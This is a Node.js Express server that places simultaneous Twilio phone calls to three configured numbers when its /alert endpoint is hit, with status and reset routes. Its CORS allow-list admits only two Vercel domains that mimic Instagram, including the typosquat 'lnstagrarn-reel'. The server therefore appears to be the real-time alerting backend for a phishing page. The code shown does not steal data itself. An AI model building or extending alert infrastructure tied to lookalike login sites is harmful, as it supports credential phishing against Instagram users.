require("dotenv").config();

const express = require("express");
const cors = require("cors");
const twilio = require("twilio");

const app = express();

app.use(cors({
    origin: [
        "https://account-instagram-com.vercel.app",
        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
    ]
}));

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// --------------------------------------------------
// Environment variables
// --------------------------------------------------

const {
    TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN,
    TWILIO_FROM_NUMBER,
    ALERT_TO_1,
    ALERT_TO_2,
    ALERT_TO_3
} = process.env;

if (
    !TWILIO_ACCOUNT_SID ||
    !TWILIO_AUTH_TOKEN ||
    !TWILIO_FROM_NUMBER ||
    !ALERT_TO_1 ||
    !ALERT_TO_2 ||
    !ALERT_TO_3
) {
    throw new Error("Missing required environment variables");
}

// --------------------------------------------------
// Twilio client
// --------------------------------------------------

const twilioClient = twilio(
    TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN
);

// --------------------------------------------------
// Alert state
// --------------------------------------------------

let alertState = {
    active: false,
    startedAt: null,

    people: {
        person1: {
            number: ALERT_TO_1,
            status: "idle",
            callSid: null
        },

        person2: {
            number: ALERT_TO_2,
            status: "idle",
            callSid: null
        },

        person3: {
            number: ALERT_TO_3,
            status: "idle",
            callSid: null
        }
    }
};

// --------------------------------------------------
// Health
// --------------------------------------------------

app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        message: "Server is running"
    });
});

// --------------------------------------------------
// Start 3 calls
// --------------------------------------------------

app.post("/alert", async (req, res) => {

    if (alertState.active) {
        return res.status(409).json({
            success: false,
            message: "An alert is already active."
        });
    }

    alertState = {
        active: true,
        startedAt: new Date().toISOString(),

        people: {
            person1: {
                number: ALERT_TO_1,
                status: "calling",
                callSid: null
            },

            person2: {
                number: ALERT_TO_2,
                status: "calling",
                callSid: null
            },

            person3: {
                number: ALERT_TO_3,
                status: "calling",
                callSid: null
            }
        }
    };

    const people = [
        ["person1", ALERT_TO_1],
        ["person2", ALERT_TO_2],
        ["person3", ALERT_TO_3]
    ];

    // Run the same Twilio call request for all 3 numbers
    const calls = people.map(async ([person, number]) => {

        try {

            console.log(
                `${person}: starting call to ${number}`
            );

            const call = await twilioClient.calls.create({
                to: number,

                from: TWILIO_FROM_NUMBER,

                url: "https://webhooks.twilio.com/v1/Voice/Template/voice_keyboard_input"
            });

            alertState.people[person].status = "calling";
            alertState.people[person].callSid = call.sid;

            console.log(
                `${person}: call started`
            );

            console.log(
                `${person}: ${call.sid}`
            );

        } catch (error) {

            alertState.people[person].status = "call_failed";

            console.error(
                `${person}: call failed`
            );

            console.error(
                error.message
            );
        }
    });

    await Promise.all(calls);

    res.json({
        success: true,
        message: "All calls processed",
        status: alertState
    });
});

// --------------------------------------------------
// Status
// --------------------------------------------------

app.get("/alert/status", (req, res) => {
    res.json(alertState);
});

// --------------------------------------------------
// Reset
// --------------------------------------------------

app.post("/alert/reset", (req, res) => {

    alertState = {
        active: false,
        startedAt: null,

        people: {
            person1: {
                number: ALERT_TO_1,
                status: "idle",
                callSid: null
            },

            person2: {
                number: ALERT_TO_2,
                status: "idle",
                callSid: null
            },

            person3: {
                number: ALERT_TO_3,
                status: "idle",
                callSid: null
            }
        }
    };

    res.json({
        success: true,
        message: "Alert state reset"
    });
});

// --------------------------------------------------
// Start server
// --------------------------------------------------

const PORT = process.env.PORT || 1000;

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
